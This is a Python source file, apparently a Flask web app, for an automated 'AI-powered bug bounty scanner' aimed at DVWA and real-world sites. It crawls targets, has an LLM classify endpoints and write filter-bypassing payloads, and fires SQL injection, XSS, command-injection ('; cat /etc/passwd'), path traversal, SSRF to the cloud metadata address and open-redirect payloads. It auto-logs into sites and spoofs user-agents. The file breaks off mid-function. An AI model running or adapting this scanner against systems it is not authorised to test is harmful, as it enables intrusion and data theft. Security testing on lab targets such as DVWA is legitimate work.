"""
AI-Powered Bug Bounty Scanner — Production Edition
Supports: DVWA + Real-world web applications
Features: Smart crawling, AI classification, automated attack, real-time dashboard
"""

import os
import json
import time
import hashlib
import threading
import random
import re
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, jsonify, send_file
from flask_socketio import SocketIO
import requests as http_req
from bs4 import BeautifulSoup
import urllib3

# Try importing genai for Gemini
try:
    from google import genai
except ImportError:
    genai = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── App ─────────────────────────────────────────────────────────────────────

app = Flask(__name__, static_folder='static')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'bugbounty-scanner-2026')
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins='*')

Path('reports').mkdir(exist_ok=True)
if not Path('findings.json').exists():
    Path('findings.json').write_text('[]')

# ─── AI Provider Setup ──────────────────────────────────────────────────────

OPENROUTER_API_KEY = os.environ.get('OPENROUTER_API_KEY', '')
GROQ_API_KEY = os.environ.get('GROQ_API_KEY', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

gemini_client = None
if GEMINI_API_KEY and genai:
    try:
        gemini_client = genai.Client(api_key=GEMINI_API_KEY)
    except Exception:
        pass

if OPENROUTER_API_KEY:
    AI_PROVIDER = 'openrouter'
elif GROQ_API_KEY:
    AI_PROVIDER = 'groq'
elif gemini_client:
    AI_PROVIDER = 'gemini'
else:
    AI_PROVIDER = 'none'
print(f"  🤖 AI Provider: {AI_PROVIDER.upper()}")

# ─── Global State ────────────────────────────────────────────────────────────

scan_active = False
scan_cancel = threading.Event()   # Signal to cancel scan
findings_lock = threading.Lock()
ai_call_lock = threading.Lock()

# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
]

# ─── Helpers ─────────────────────────────────────────────────────────────────

def log(level, text):
    socketio.emit('log', {'level': level, 'text': str(text), 'ts': time.time()})
    print(f"[{level.upper():6s}] {text}")

def emit_progress(current, total, stage=''):
    pct = round((current / max(total, 1)) * 100)
    socketio.emit('progress', {'current': current, 'total': total, 'pct': pct, 'stage': stage})

def fp(method, url, param, vuln):
    return hashlib.sha256(f"{method}:{url}:{param}:{vuln}".lower().encode()).hexdigest()[:8]

def read_findings():
    with findings_lock:
        try:
            return json.loads(Path('findings.json').read_text())
        except Exception:
            return []

def write_finding(finding):
    with findings_lock:
        try:
            findings = json.loads(Path('findings.json').read_text())
        except Exception:
            findings = []
        if any(f['id'] == finding['id'] for f in findings):
            return False
        findings.append(finding)
        Path('findings.json').write_text(json.dumps(findings, indent=2))
        return True

def is_cancelled():
    return scan_cancel.is_set()

def ai_call(prompt, temp=0.3):
    """Call AI — one request at a time (rate-limited)."""
    with ai_call_lock:
        result = _do_ai_call(prompt, temp)
        time.sleep(1.5)
        return result

def _do_ai_call(prompt, temp=0.3):
    if OPENROUTER_API_KEY:
        return _openrouter_call(prompt, temp)
    if GROQ_API_KEY:
        return _groq_call(prompt, temp)
    if gemini_client:
        return _gemini_call(prompt, temp)
    raise Exception("No AI provider configured (set OPENROUTER_API_KEY, GROQ_API_KEY, or GEMINI_API_KEY)")

def _openrouter_call(prompt, temp=0.3):
    resp = http_req.post(
        'https://openrouter.ai/api/v1/chat/completions',
        headers={
            'Authorization': f'Bearer {OPENROUTER_API_KEY}',
            'Content-Type': 'application/json',
            'HTTP-Referer': 'http://localhost:7331',
            'X-Title': 'Bug Bounty Scanner'
        },
        json={
            'model': 'arcee-ai/trinity-large-preview:free',
            'messages': [{'role': 'user', 'content': prompt}],
            'temperature': temp,
            'max_tokens': 1024
        },
        timeout=60
    )
    if resp.status_code != 200:
        raise Exception(f"OpenRouter API error {resp.status_code}: {resp.text[:200]}")
    return resp.json()['choices'][0]['message']['content'].strip()

def _groq_call(prompt, temp=0.3):
    resp = http_req.post(
        'https://api.groq.com/openai/v1/chat/completions',
        headers={
            'Authorization': f'Bearer {GROQ_API_KEY}',
            'Content-Type': 'application/json'
        },
        json={
            'model': 'llama-3.3-70b-versatile',
            'messages': [{'role': 'user', 'content': prompt}],
            'temperature': temp,
            'max_tokens': 1024
        },
        timeout=30
    )
    if resp.status_code != 200:
        raise Exception(f"Groq API error {resp.status_code}: {resp.text[:200]}")
    return resp.json()['choices'][0]['message']['content'].strip()

def _gemini_call(prompt, temp=0.3):
    resp = gemini_client.models.generate_content(
        model='gemini-2.0-flash',
        contents=prompt,
        config={'temperature': temp}
    )
    return resp.text.strip()

def parse_json(text):
    text = text.strip()
    if '```' in text:
        lines = text.split('\n')
        lines = [l for l in lines if not l.strip().startswith('```')]
        text = '\n'.join(lines)
    s1, s2 = text.find('['), text.find('{')
    if s1 == -1 and s2 == -1:
        raise ValueError("No JSON found in response")
    if s1 != -1 and (s2 == -1 or s1 < s2):
        return json.loads(text[s1:text.rfind(']') + 1])
    return json.loads(text[s2:text.rfind('}') + 1])

def normalize_url(url):
    """Normalize a URL for deduplication."""
    parsed = urlparse(url)
    # Remove fragment, normalize path
    path = parsed.path.rstrip('/') or '/'
    return urlunparse((parsed.scheme, parsed.netloc, path, '', parsed.query, ''))

def create_session(cookies_str=''):
    """Create a requests.Session with realistic headers."""
    session = http_req.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    if cookies_str:
        for cookie in cookies_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                session.cookies.set(name.strip(), value.strip())
    return session

SEVERITY = {
    'sqli': 'Critical', 'cmdi': 'Critical', 'lfi': 'High',
    'ssrf': 'High', 'xss': 'Medium', 'idor': 'High',
    'csrf': 'Medium', 'open_redirect': 'Low', 'file_upload': 'High',
    'security_headers': 'Info', 'clickjacking': 'Medium',
    'html_injection': 'Low',
}

FALLBACK_PAYLOADS = {
    'sqli': ["' OR '1'='1", "' OR '1'='1' --", "1 OR 1=1", "1 UNION SELECT NULL,NULL--", "' AND '1'='2", "' AND SLEEP(3)--"],
    'xss': ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', "'-alert(1)-'", '<img src=x onerror=alert(document.domain)>'],
    'cmdi': ['; ls', '| id', '& whoami', '127.0.0.1; cat /etc/passwd', '`id`', '; uname -a'],
    'lfi': ['../../../../etc/passwd', '....//....//....//etc/passwd', '/etc/passwd%00', '..\\..\\..\\..\\windows\\win.ini'],
    'ssrf': ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]/', 'http://0x7f000001/'],
    'idor': ['1', '2', '0', '999', '-1'],
    'open_redirect': ['https://evil.com', '//evil.com', '/\\evil.com', 'https://evil.com%2F%2F'],
}

# ─── DVWA Auto-Login ─────────────────────────────────────────────────────────

def dvwa_auto_login(base_url, username='admin', password='password'):
    """
    Auto-login to DVWA. Handles DB setup, CSRF tokens, security level.
    Returns a requests.Session with valid cookies, or None.
    """
    log('info', f'Auto-logging into DVWA at {base_url}...')

    try:
        # Step 0: Ensure DB is set up
        log('info', '  Ensuring database is initialized...')
        setup_session = create_session()
        setup_url = urljoin(base_url, 'setup.php')
        try:
            r_setup = setup_session.get(setup_url, timeout=10)
            soup_setup = BeautifulSoup(r_setup.text, 'html.parser')
            setup_token = soup_setup.find('input', {'name': 'user_token'})
            if setup_token:
                setup_session.post(setup_url, data={
                    'create_db': 'Create / Reset Database',
                    'user_token': setup_token['value']
                }, timeout=15, allow_redirects=True)
                log('ok', '  Database created/reset')
                time.sleep(2)  # Wait for DB to be ready
            else:
                log('info', '  Database already initialized')
        except Exception as e:
            log('warn', f'  DB setup note: {e}')

        # Step 1: Fresh session for login
        session = create_session()

        login_url = urljoin(base_url, 'login.php')
        r = session.get(login_url, timeout=10)
        log('info', f'  Login page: {r.status_code} ({len(r.text)} bytes)')

        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        user_token = token_input['value'] if token_input else ''

        # Step 2: POST login
        r2 = session.post(login_url, data={
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }, allow_redirects=False, timeout=10)

        location = r2.headers.get('Location', '')
        if 'login' in location.lower():
            log('error', '  Login FAILED — wrong credentials')
            return None

        # Follow redirect
        session.get(urljoin(base_url, location), timeout=10)
        log('ok', f'  Logged in! → {location}')

        # Step 3: Set security level to low (most vulns detectable)
        session.cookies.set('security', 'low')
        sec_url = urljoin(base_url, 'security.php')
        r3 = session.get(sec_url, timeout=10)
        soup3 = BeautifulSoup(r3.text, 'html.parser')
        sec_token = soup3.find('input', {'name': 'user_token'})
        if sec_token:
            session.post(sec_url, data={
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': sec_token['value']
            }, timeout=10)
        session.cookies.set('security', 'low')
        log('ok', '  Security set to LOW')

        # Step 4: Disable PHPIDS
        try:
            phpids_url = urljoin(base_url, 'security.php')
            r_ids = session.get(phpids_url, timeout=10)
            if 'phpids' in r_ids.text.lower() or 'Enable IDS' in r_ids.text:
                log('ok', '  PHPIDS already disabled')
            elif 'Disable IDS' in r_ids.text:
                # Find the disable link
                soup_ids = BeautifulSoup(r_ids.text, 'html.parser')
                disable_link = soup_ids.find('a', string=re.compile(r'Disable', re.I))
                if disable_link:
                    session.get(urljoin(base_url, disable_link['href']), timeout=10)
                    log('ok', '  PHPIDS disabled')
        except Exception:
            pass

        # Step 5: Verify access
        test_url = urljoin(base_url, 'vulnerabilities/sqli/?id=1&Submit=Submit')
        r_test = session.get(test_url, timeout=10, allow_redirects=False)
        if r_test.status_code in (301, 302, 303, 307):
            redir = r_test.headers.get('Location', '')
            if 'login' in redir.lower():
                log('error', '  Session invalid — still redirecting to login')
                return None

        log('ok', f'  Session verified! SQLi page: {r_test.status_code} ({len(r_test.text)} bytes)')
        return session

    except Exception as e:
        log('error', f'  Login error: {e}')
        return None


# ─── Generic Auto-Login ──────────────────────────────────────────────────────

def generic_auto_login(base_url, username, password):
    """
    Attempt to find and submit a login form on a generic website.
    Returns session if successful, None otherwise.
    """
    log('info', f'Attempting generic auto-login at {base_url}...')
    session = create_session()

    try:
        # Common login paths to try
        login_paths = ['login', 'login.php', 'signin', 'auth/login', 'user/login',
                       'account/login', 'admin/login', 'wp-login.php', '']

        for path in login_paths:
            login_url = urljoin(base_url, path)
            try:
                r = session.get(login_url, timeout=8, allow_redirects=True)
                if r.status_code != 200:
                    continue

                soup = BeautifulSoup(r.text, 'html.parser')
                forms = soup.find_all('form')

                for form in forms:
                    inputs = form.find_all('input')
                    input_names = {inp.get('name', '').lower(): inp for inp in inputs if inp.get('name')}

                    # Look for username/password fields
                    user_field = None
                    pass_field = None
                    for name, inp in input_names.items():
                        inp_type = (inp.get('type') or 'text').lower()
                        if inp_type == 'password' or name in ('password', 'pass', 'passwd', 'pwd'):
                            pass_field = inp.get('name')
                        elif name in ('username', 'user', 'login', 'email', 'uname', 'user_login') or inp_type == 'email':
                            user_field = inp.get('name')

                    if not user_field or not pass_field:
                        continue

                    log('info', f'  Found login form at {login_url} (fields: {user_field}, {pass_field})')

                    # Build form data
                    form_data = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if not name:
                            continue
                        if name == user_field:
                            form_data[name] = username
                        elif name == pass_field:
                            form_data[name] = password
                        else:
                            form_data[name] = inp.get('value', '')

                    action = form.get('action', '')
                    method = (form.get('method', 'POST')).upper()
                    submit_url = urljoin(login_url, action) if action else login_url

                    if method == 'POST':
                        r2 = session.post(submit_url, data=form_data, timeout=10, allow_redirects=True)
                    else:
                        r2 = session.get(submit_url, params=form_data, timeout=10, allow_redirects=True)

                    # Check if login succeeded (no longer on login page, or dashboard keywords)
                    final_url = r2.url.lower()
                    body_lower = r2.text.lower()
                    if ('login' not in final_url and 'signin' not in final_url) or \
                       any(kw in body_lower for kw in ['dashboard', 'welcome', 'logout', 'sign out', 'my account']):
                        log('ok', f'  Login appears successful → {r2.url}')
                        return session
                    else:
                        log('warn', f'  Login attempt failed at {submit_url}')

            except Exception:
                continue

    except Exception as e:
        log('error', f'  Generic login error: {e}')

    return None


# ─── Session Health Check ────────────────────────────────────────────────────

def check_session_health(session, base_url, is_dvwa=False):
    """Verify the session is still valid."""
    try:
        r = session.get(base_url, timeout=8, allow_redirects=False)
        if r.status_code in (301, 302, 303, 307):
            location = r.headers.get('Location', '').lower()
            if 'login' in location:
                return False
        return True
    except Exception:
        return False


# ─── Stage 1: Crawl ─────────────────────────────────────────────────────────

DVWA_VULN_PATHS = [
    'vulnerabilities/xss_r/', 'vulnerabilities/xss_s/', 'vulnerabilities/xss_d/',
    'vulnerabilities/sqli/', 'vulnerabilities/sqli_blind/',
    'vulnerabilities/exec/', 'vulnerabilities/fi/',
    'vulnerabilities/csrf/', 'vulnerabilities/upload/',
    'vulnerabilities/brute/', 'vulnerabilities/weak_id/',
]

def _is_directory_listing(response_text):
    """Detect Apache/Nginx directory listing pages."""
    soup = BeautifulSoup(response_text, 'html.parser')
    title = soup.find('title')
    if title and 'index of' in title.text.lower():
        return True
    if '<h1>Index of' in response_text or 'Directory listing for' in response_text:
        return True
    return False

def _parse_robots(base_url, session):
    """Parse robots.txt for interesting paths."""
    paths = []
    try:
        r = session.get(urljoin(base_url, 'robots.txt'), timeout=5)
        if r.status_code == 200 and 'text' in r.headers.get('Content-Type', ''):
            for line in r.text.splitlines():
                line = line.strip()
                if line.startswith('Disallow:') or line.startswith('Allow:'):
                    path = line.split(':', 1)[1].strip()
                    if path and path != '/' and '*' not in path:
                        paths.append(path)
                elif line.startswith('Sitemap:'):
                    paths.append(line.split(':', 1)[1].strip())
    except Exception:
        pass
    return paths

def _parse_sitemap(base_url, session):
    """Parse sitemap.xml for additional URLs."""
    urls = []
    try:
        r = session.get(urljoin(base_url, 'sitemap.xml'), timeout=5)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, 'xml')
            for loc in soup.find_all('loc'):
                urls.append(loc.text.strip())
    except Exception:
        pass
    return urls[:50]  # Limit

def step_crawl(target_url, session, max_pages=100):
    log('info', '═══ STAGE 1: CRAWL ═══')
    log('info', f'Target: {target_url}')

    base = target_url.rstrip('/')
    parsed_base = urlparse(base)
    base_domain = parsed_base.netloc
    base_path = parsed_base.path.rstrip('/')

    # Detect if target is DVWA
    is_dvwa = False
    try:
        r_check = session.get(target_url, timeout=8)
        page_text = r_check.text.lower()
        if 'damn vulnerable web application' in page_text or 'dvwa' in page_text:
            is_dvwa = True
            log('info', '  🎯 Detected DVWA — seeding known vulnerability paths')
        else:
            log('info', '  🌐 Generic target — crawling organically')
    except Exception:
        pass

    # Build initial URL list
    start_url = f"{parsed_base.scheme}://{base_domain}{base_path}/index.php"
    to_visit = [target_url, start_url]

    # DVWA seeded paths
    if is_dvwa:
        seeded = [f"{parsed_base.scheme}://{base_domain}{base_path}/{p}" for p in DVWA_VULN_PATHS]
        to_visit += seeded

    # Robots.txt discovery
    robot_paths = _parse_robots(target_url, session)
    if robot_paths:
        log('info', f'  📄 robots.txt: found {len(robot_paths)} paths')
        for rp in robot_paths:
            if rp.startswith('http'):
                to_visit.append(rp)
            else:
                to_visit.append(urljoin(target_url, rp))

    # Sitemap discovery
    sitemap_urls = _parse_sitemap(target_url, session)
    if sitemap_urls:
        log('info', f'  🗺 sitemap.xml: found {len(sitemap_urls)} URLs')
        to_visit += sitemap_urls

    visited = set()
    endpoints = []
    skip_ext = {'.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico',
                '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.pdf', '.zip',
                '.mp3', '.avi', '.mov', '.webp', '.webm', '.map'}
    skip_pages = {'logout.php', 'setup.php', 'login.php', 'security.php', 'phpinfo.php'}

    while to_visit and len(visited) < max_pages:
        if is_cancelled():
            log('warn', '  Scan cancelled during crawl')
            break

        url = to_visit.pop(0).split('#')[0]

        # Normalize for dedup
        norm = normalize_url(url)
        if norm in visited:
            continue

        parsed = urlparse(url)
        if parsed.netloc != base_domain:
            continue
        if any(url.lower().endswith(e) for e in skip_ext):
            continue
        if any(skip in url.lower().split('/')[-1].lower() for skip in skip_pages):
            continue

        visited.add(norm)

        try:
            resp = session.get(url, timeout=10, allow_redirects=True)
            content_type = resp.headers.get('Content-Type', '')
            if 'text/html' not in content_type and 'application/xhtml' not in content_type:
                continue

            log('info', f'  → GET {url}  [{resp.status_code}] {len(resp.text)} bytes')
        except Exception as e:
            log('warn', f'  ✗ GET {url} FAILED: {e}')
            continue

        # Detect login redirect
        if 'login.php' in resp.url and 'login' not in url.lower():
            log('warn', f'  ⚠ Redirected to login — skipping')
            continue

        if _is_directory_listing(resp.text):
            log('info', f'  ⏭ Directory listing — skipping')
            continue

        soup = BeautifulSoup(resp.text, 'html.parser')

        # Extract forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = (form.get('method', 'GET')).upper()
            form_url = urljoin(url, action) if action else url
            params = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name:
                    params.append({
                        'name': name,
                        'type': inp.get('type', 'text'),
                        'default_value': inp.get('value', '')
                    })
            if params:
                pnames = {p['name'].lower() for p in params}
                # Skip login forms
                if 'username' in pnames and 'password' in pnames:
                    continue
                if 'user_login' in pnames and 'user_pass' in pnames:
                    continue
                endpoints.append({
                    'url': form_url, 'method': method,
                    'source': url, 'params': params, 'type': 'form'
                })
                log('ok', f'    📋 Form: {method} {form_url} → params={[p["name"] for p in params]}')

        # Extract links
        for a in soup.find_all('a', href=True):
            link = urljoin(url, a['href'])
            link_parsed = urlparse(link)
            if link_parsed.netloc != base_domain:
                continue
            if link_parsed.query:
                qs = parse_qs(link_parsed.query)
                params = [{'name': k, 'type': 'query', 'default_value': v[0]} for k, v in qs.items()]
                endpoints.append({
                    'url': link.split('?')[0], 'method': 'GET',
                    'source': url, 'params': params, 'type': 'query'
                })
            clean = link.split('?')[0].split('#')[0]
            norm_clean = normalize_url(clean)
            if norm_clean not in visited:
                to_visit.append(link)

        # Small delay to be respectful
        time.sleep(0.2)

    # Deduplicate endpoints
    seen = set()
    unique = []
    for ep in endpoints:
        key = f"{ep['method']}:{ep['url']}:{','.join(sorted(p['name'] for p in ep['params']))}"
        if key not in seen:
            seen.add(key)
            unique.append(ep)

    log('ok', f'Crawl done: {len(visited)} pages visited, {len(unique)} unique endpoints found')
    return unique, is_dvwa


# ─── Stage 2: Classify ──────────────────────────────────────────────────────

def step_classify(endpoints):
    log('info', '═══ STAGE 2: CLASSIFY ═══')

    ep_summary = [{'i': i, 'url': e['url'], 'method': e['method'],
                    'params': [p['name'] for p in e['params']], 'type': e['type']}
                   for i, e in enumerate(endpoints)]

    prompt = f"""You are a web security expert. Classify vulnerability types for these endpoints.

ENDPOINTS:
{json.dumps(ep_summary, indent=2)}

Rules:
- id/uid/user_id → sqli, idor
- name/search/comment/text/message/txtName/mtxMessage → xss
- ip/host/cmd/command/ping → cmdi
- page/file/path/include → lfi
- url/redirect/next → open_redirect, ssrf
- upload paths → file_upload
- Any form without CSRF token → csrf

Types: sqli, xss, cmdi, lfi, ssrf, idor, csrf, open_redirect, file_upload

Respond ONLY JSON array:
[{{"i": 0, "vuln_types": ["sqli"], "priority": "high"}}]"""

    try:
        raw = ai_call(prompt, temp=0.2)
        cls_list = parse_json(raw)
        for c in cls_list:
            idx = c.get('i', -1)
            if 0 <= idx < len(endpoints):
                endpoints[idx]['vuln_types'] = c.get('vuln_types', [])
                endpoints[idx]['priority'] = c.get('priority', 'medium')
                log('ai', f'  {endpoints[idx]["url"]} → {c.get("vuln_types", [])}')
    except Exception as e:
        log('warn', f'AI classify failed ({e}), using heuristics')
        for ep in endpoints:
            ep['vuln_types'] = _guess(ep)
            ep['priority'] = 'medium'

    # Ensure all endpoints have vuln_types
    for ep in endpoints:
        if not ep.get('vuln_types'):
            ep['vuln_types'] = _guess(ep)
            ep['priority'] = 'medium'

    order = {'high': 0, 'medium': 1, 'low': 2}
    endpoints.sort(key=lambda e: order.get(e.get('priority', 'medium'), 1))
    return endpoints

def _guess(ep):
    types = set()
    url_lower = ep['url'].lower()
    for p in ep['params']:
        n = p['name'].lower()
        if n in ('id', 'uid', 'user_id', 'item', 'no', 'userid', 'article', 'product_id', 'order_id'):
            types.update(['sqli', 'idor'])
        if n in ('search', 'q', 'name', 'comment', 'text', 'msg', 'message',
                 'txtname', 'mtxmessage', 'txtmessage', 'input', 'query',
                 'keyword', 'term', 'feedback', 'data', 'content', 'value',
                 'title', 'body', 'description', 'default'):
            types.add('xss')
        if n in ('ip', 'host', 'cmd', 'command', 'ping', 'target', 'exec',
                 'run', 'system', 'shell'):
            types.add('cmdi')
        if n in ('page', 'file', 'path', 'include', 'doc', 'document',
                 'filename', 'load', 'template', 'view', 'lang'):
            types.add('lfi')
        if n in ('url', 'redirect', 'next', 'return', 'goto', 'link',
                 'dest', 'destination', 'continue', 'return_url', 'redirect_to'):
            types.update(['open_redirect', 'ssrf'])
    if 'upload' in url_lower:
        types.add('file_upload')
    if 'xss' in url_lower:
        types.add('xss')
    if 'sqli' in url_lower or 'sql' in url_lower:
        types.add('sqli')
    if 'cmdi' in url_lower or 'exec' in url_lower or 'cmd' in url_lower:
        types.add('cmdi')
    if '/fi/' in url_lower or 'file' in url_lower:
        types.add('lfi')
    if 'csrf' in url_lower:
        types.add('csrf')
    if 'redirect' in url_lower:
        types.add('open_redirect')
    return list(types) if types else ['xss', 'sqli']


# ─── Stage 3: Attack ────────────────────────────────────────────────────────

def step_attack(endpoints, session, is_dvwa=False):
    log('info', '═══ STAGE 3: ATTACK ═══')

    testable = [e for e in endpoints if e.get('vuln_types')]
    total = sum(len(e['vuln_types']) for e in testable)
    log('info', f'Testing {total} endpoint/vuln combinations')
    count = 0

    for ep in testable:
        if is_cancelled():
            log('warn', 'Scan cancelled during attack phase')
            break

        # Pick the best param to test
        skip = {'submit', 'login', 'btnsign', 'btnclear', 'btnsubmit',
                'user_token', 'csrf_token', 'change', 'upload', 'max_file_size',
                'step', 'send', 'seclev_submit', '_token', 'csrf',
                'captcha', 'submit_btn', 'action'}
        test_params = [p for p in ep['params']
                       if p['name'].lower() not in skip
                       and p.get('type', '') not in ('submit', 'hidden', 'file')]
        if not test_params:
            test_params = [p for p in ep['params'] if p['name'].lower() not in skip]
        if not test_params:
            continue

        target_p = test_params[0]

        for vtype in ep['vuln_types']:
            if is_cancelled():
                break

            count += 1
            log('attack', f'━━━ [{count}/{total}] {vtype.upper()} → {ep["method"]} {ep["url"]} ({target_p["name"]}) ━━━')
            emit_progress(count, total, 'attack')

            try:
                payloads = _get_payloads(vtype, ep)

                # Baseline request
                bl = _send(session, ep, target_p['name'], target_p.get('default_value', 'test'))
                if bl:
                    log('info', f'  📤 Baseline: {ep["method"]} → [{bl["status_code"]}] {bl["length"]} bytes')

                for payload in payloads:
                    if is_cancelled():
                        break

                    log('attack', f'  🔫 Payload: {payload}')

                    resp = _send(session, ep, target_p['name'], payload)
                    if not resp:
                        log('warn', f'  ✗ No response')
                        continue

                    log('info', f'  📥 Response: [{resp["status_code"]}] {resp["length"]} bytes')

                    # Check for session death
                    if resp['status_code'] == 302 or 'login.php' in resp.get('url', ''):
                        log('warn', f'  ⚠ Session expired — skipping')
                        continue

                    vuln, evidence = _analyze(vtype, ep['url'], target_p['name'], payload, bl, resp)

                    if vuln:
                        log('ok', f'  ✅ VULNERABLE! {vtype.upper()} confirmed!')
                        log('ok', f'  Evidence: {evidence}')
                        fid = fp(ep['method'], ep['url'], target_p['name'], vtype)
                        finding = {
                            'id': fid, 'url': ep['url'], 'method': ep['method'],
                            'param': target_p['name'], 'vuln_type': vtype,
                            'payload': payload, 'evidence': evidence,
                            'severity': SEVERITY.get(vtype, 'Low'),
                            'confirmed': True,
                            'response_code': resp['status_code'],
                            'response_snippet': resp['body'][:500],
                            'timestamp': time.time()
                        }
                        if write_finding(finding):
                            socketio.emit('finding', finding)
                        break
                    else:
                        log('info', f'  ✗ Not vulnerable with this payload')

                time.sleep(0.3)
            except Exception as e:
                log('error', f'  Error testing {ep["url"]}: {e}')

def _send(session, ep, param_name, value):
    try:
        params = {}
        for p in ep['params']:
            if p['name'] == param_name:
                params[p['name']] = value
            else:
                params[p['name']] = p.get('default_value', '') or 'test'

        if ep['method'] == 'GET':
            url = f"{ep['url']}?{urlencode(params)}"
            resp = session.get(url, timeout=12, allow_redirects=False)
        else:
            resp = session.post(ep['url'], data=params, timeout=12, allow_redirects=False)

        # Handle redirects
        if resp.status_code in (301, 302, 303, 307):
            location = resp.headers.get('Location', '')
            if 'login' in location.lower():
                return {
                    'status_code': 302,
                    'body': 'REDIRECTED TO LOGIN - SESSION EXPIRED',
                    'url': location,
                    'length': 0
                }
            # Follow non-login redirects
            try:
                resp = session.get(urljoin(ep['url'], location), timeout=12, allow_redirects=False)
            except Exception:
                pass

        return {
            'status_code': resp.status_code,
            'body': resp.text[:5000],
            'url': resp.url if hasattr(resp, 'url') else ep['url'],
            'length': len(resp.text),
            'headers': dict(resp.headers)
        }
    except Exception as e:
        log('warn', f'  Request error: {e}')
        return None

def _get_payloads(vtype, ep):
    pnames = [p['name'] for p in ep['params']]
    prompt = f"""Generate 3-5 penetration test payloads.

VULN: {vtype}
URL: {ep['url']}
METHOD: {ep['method']}
PARAMS: {json.dumps(pnames)}

For sqli: UNION, OR tautology, error-based, time-based.
For xss: script, img onerror, svg onload — bypass common filters.
For cmdi: semicolon+command, pipe+command, backticks.
For lfi: traversal to /etc/passwd with different encodings.
For open_redirect: external URLs with various bypass techniques.

ONLY JSON array of strings:
["payload1", "payload2"]"""

    try:
        raw = ai_call(prompt, temp=0.4)
        result = parse_json(raw)
        if isinstance(result, list):
            out = [p if isinstance(p, str) else p.get('payload', str(p)) for p in result]
            return out[:5] if out else FALLBACK_PAYLOADS.get(vtype, ['test'])
    except Exception:
        pass
    return FALLBACK_PAYLOADS.get(vtype, ['test'])

def _extract_relevant(html):
    """Strip HTML boilerplate, return just the text content."""
    soup = BeautifulSoup(html, 'html.parser')
    for tag in soup(['script', 'style', 'head', 'nav', 'footer']):
        tag.decompose()
    text = soup.get_text(separator='\n', strip=True)
    pres = [p.get_text() for p in BeautifulSoup(html, 'html.parser').find_all('pre')]
    if pres:
        text = '\n'.join(pres) + '\n---FULL TEXT---\n' + text
    return text[:3000]

def _analyze(vtype, url, param, payload, baseline, resp):
    if not resp:
        return False, ""

    body = resp['body']
    bl_body = baseline['body'] if baseline else ''
    bl_len = baseline['length'] if baseline else 0
    atk_len = resp['length']

    # ── LOCAL PATTERN MATCHING ──────────────────────────────────────────

    if vtype == 'sqli':
        sql_errors = ['mysql_', 'You have an error in your SQL syntax',
                      'Warning: mysql', 'Unclosed quotation mark',
                      'SQLSTATE[', 'pg_query', 'ORA-', 'SQL syntax',
                      'sqlite3.OperationalError', 'psycopg2', 'MySQLdb',
                      'sqlalchemy.exc', 'unterminated quoted string']
        for err in sql_errors:
            if err.lower() in body.lower() and err.lower() not in bl_body.lower():
                return True, f"SQL error message found: {err}"

        # Multiple data rows returned (DVWA pattern)
        atk_pres = len(BeautifulSoup(body, 'html.parser').find_all('pre'))
        bl_pres = len(BeautifulSoup(bl_body, 'html.parser').find_all('pre'))
        if atk_pres > bl_pres and atk_pres >= 2:
            return True, f"Data leaked: {atk_pres} data rows vs {bl_pres} baseline"

        # Significantly larger response with data
        if atk_len > bl_len * 1.3 and atk_len - bl_len > 100:
            soup = BeautifulSoup(body, 'html.parser')
            pres = soup.find_all('pre')
            tds = soup.find_all('td')
            if pres or len(tds) > 4:
                return True, f"Response significantly larger ({atk_len} vs {bl_len} bytes) with data output"

    elif vtype == 'xss':
        # ── STRICT XSS detection ──
        # Only confirm XSS if a JavaScript-executing payload is reflected.
        # HTML injection (<u>, <b>, <i>, etc.) is NOT XSS — it cannot execute JS.
        
        # These are the ONLY markers that prove JS execution is possible
        js_exec_markers = [
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg/onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe onload=alert(1)>',
            'javascript:alert(1)',
        ]
        
        # Check if a JS-executing payload is reflected unescaped
        for marker in js_exec_markers:
            if marker.lower() in body.lower() and marker.lower() not in bl_body.lower():
                return True, f"XSS confirmed — JS-executing payload reflected: {marker}"
        
        # Check if the full payload is reflected AND it contains JS execution capability
        if payload in body and payload not in bl_body:
            payload_lower = payload.lower()
            has_js = any(trigger in payload_lower for trigger in [
                '<script', 'onerror=', 'onload=', 'onfocus=', 'onmouseover=',
